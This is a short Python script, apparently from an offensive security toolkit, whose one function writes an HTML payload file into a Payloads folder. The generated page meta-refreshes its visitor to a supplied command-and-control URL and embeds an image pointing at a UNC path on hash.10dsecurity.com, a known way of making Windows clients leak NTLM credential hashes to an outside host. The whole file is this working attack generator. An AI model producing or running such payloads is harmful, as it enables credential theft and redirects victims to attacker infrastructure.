#!/usr/bin/python3

def redirect_gen(_Name, _C2Url):
    vHTML = "./Payloads/" + _Name + ".html"
    try:
        redirect = "<html>\n"
        redirect += "<head>\n"
        redirect += "<title>Redirect</title>\n"
        redirect += '<meta http-equiv="Refresh"\n'
        redirect += 'content="0;url='
        redirect += str(_C2Url)
        redirect += "/"
        redirect += str(vHTML)
        redirect += '">\n'
        redirect += "</head>\n"
        redirect += "<body>\n"
        redirect += r'<img src="file:///\\hash.10dsecurity.com\gotcha.jpg"/>'
        redirect += "\n<br>\n"
        redirect += "</body>"
        redirect += "</html>"

        rf = open(vHTML, "w+")
        rf.write(redirect)
        rf.close()

    except Exception as e:
        print('\n[!] Error, Unable to write HTML Redirect.')
        print(' Yielded the following error %s' % e)
